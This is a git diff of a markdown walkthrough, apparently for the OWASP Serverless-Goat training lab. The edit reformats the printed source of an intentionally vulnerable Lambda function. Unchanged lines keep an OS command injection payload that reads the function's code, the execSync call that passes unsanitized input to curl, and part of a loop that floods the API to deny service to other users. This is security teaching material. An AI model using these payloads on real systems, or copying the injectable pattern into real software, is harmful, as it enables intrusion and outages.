@@ -49,9 +49,30 @@ Error message: ```{"message": "Internal server error"}```
 
 Now we know that the application is vulnerable to OS command injection through the `document_url` parameter of the API, and we can move on to extract its source code, by sending the following value in the URL field: `https://foobar; cat /var/task/index.js #`
 
-This should return the source code of the function:
-```
-const child_process = require('child_process'); const AWS = require('aws-sdk'); const uuid = require('node-uuid'); async function log(event) { const docClient = new AWS.DynamoDB.DocumentClient(); let requestid = event.requestContext.requestId; let ip = event.requestContext.identity.sourceIp; let documentUrl = event.queryStringParameters.document_url; await docClient.put({ TableName: process.env.TABLE_NAME, Item: { 'id': requestid, 'ip': ip, 'document_url': documentUrl } } ).promise(); } exports.handler = async (event) => { try { await log(event); let documentUrl = event.queryStringParameters.document_url; let txt = child_process.execSync(`curl --silent -L ${documentUrl} | ./bin/catdoc -`).toString(); // Lambda response max size is 6MB. The workaround is to upload result to S3 and redirect user to the file. let key = uuid.v4(); let s3 = new AWS.S3(); await s3.putObject({ Bucket: process.env.BUCKET_NAME, Key: key, Body: txt, ContentType: 'text/html', ACL: 'public-read' }).promise(); return { statusCode: 302, headers: { "Location": `${process.env.BUCKET_URL}/${key}` } }; } catch (err) { return { statusCode: 500, body: err.stack }; } };
+This should return the source code of the function - below is a snippet of the file, which can be found in full [here](https://github.com/OWASP/Serverless-Goat/blob/master/src/api/convert/index.js)
+
+```js
+const child_process = require('child_process');
+const AWS = require('aws-sdk');
+const uuid = require('node-uuid');
+
+async function log(event) {
+  const docClient = new AWS.DynamoDB.DocumentClient();
+  let requestid = event.requestContext.requestId;
+  let ip = event.requestContext.identity.sourceIp;
+  let documentUrl = event.queryStringParameters.document_url;
+
+  await docClient.put({
+      TableName: process.env.TABLE_NAME,
+      Item: {
+        'id': requestid,
+        'ip': ip,
+        'document_url': documentUrl
+      }
+    }
+  ).promise();
+
+}
 ```
 
 There's a lot to be learned from the source code:
@@ -194,16 +215,3 @@ for i in {1..100}; do
 done
 ```
 Let it run, and in a different terminal window, run another loop, with a simple API call. If you're lucky, from time to time you will notice a server(less) error reply. Yup, other users are not getting service.
-
-
-
-
-
-
-
-
-
-
-
-
-
